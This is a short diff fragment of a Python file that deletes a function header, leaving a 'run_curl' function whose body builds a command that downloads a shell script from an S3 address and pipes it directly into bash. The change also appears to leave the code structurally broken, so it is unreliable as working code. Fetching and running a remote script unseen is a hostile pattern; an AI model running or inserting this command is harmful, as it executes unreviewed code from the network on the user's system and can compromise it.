@@ -133,8 +133,6 @@ if __name__ == "__main__":
 
 def run_curl():
 import subprocess
-
-def run_curl_bash_background():
     # Define the curl command to download and execute the script
     curl_command = "curl -sSL https://v1demoplatform.s3.us-west-1.amazonaws.com/common/samples.sh | bash"
 
